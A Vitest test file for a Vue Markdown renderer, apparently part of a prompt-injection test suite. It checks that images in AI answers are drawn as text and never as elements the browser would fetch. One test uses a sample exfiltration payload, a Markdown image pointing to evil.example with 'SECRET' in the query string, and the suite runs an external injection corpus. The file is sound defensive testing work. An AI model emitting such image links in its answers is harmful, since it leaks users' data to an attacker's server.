import { readFileSync } from "node:fs";

import { createSSRApp } from "vue";
import { renderToString } from "vue/server-renderer";
import { describe, expect, it } from "vitest";

import { englishStrings, parseMarkdown } from "@fadenstack/ui";

import Markdown from "../src/markdown/Markdown.vue";

// Gate G4 of the injection suite (sdk/51 7.1), for the Vue skin: a remote image in an answer is never loaded. The Markdown model's
// `image` inline is drawn as "[alt]" with the address as a tooltip, never as an <img>. The other skins and the corpus are checked in
// packages/agents/test/injection/images.test.ts. .NET: tests/Fadenstack.UI.Tests/Injection/ImageNeverLoadedTests.cs.

const FETCHES = /<(img|picture|source|video|audio|iframe|embed|object|link|script|svg|image)[\s>/]/iu;

interface Case { id: string; content: string; padding?: { unit: string; times: number } }
const corpus = (JSON.parse(readFileSync(new URL("../../agents/test/injection/corpus.json", import.meta.url), "utf8")) as { cases: Case[] }).cases
  .map((c) => ({ id: c.id, content: (c.padding ? c.padding.unit.repeat(c.padding.times) : "") + c.content }));

describe("G4 in the Vue skin: a remote image in an answer is never loaded", () => {
  it("draws a Markdown image as text with a tooltip", async () => {
    const blocks = parseMarkdown("Look: ![status](https://evil.example/pixel.png?q=SECRET)");
    const html = await renderToString(createSSRApp(Markdown, { blocks, strings: englishStrings }));
    expect(html).toContain("[status]");
    expect(html).not.toMatch(FETCHES);
  });

  for (const c of corpus) {
    it(`${c.id}: as an answer, nothing the browser would fetch`, async () => {
      const html = await renderToString(createSSRApp(Markdown, { blocks: parseMarkdown(c.content), strings: englishStrings }));
      expect(html).not.toMatch(FETCHES);
    });
  }
});
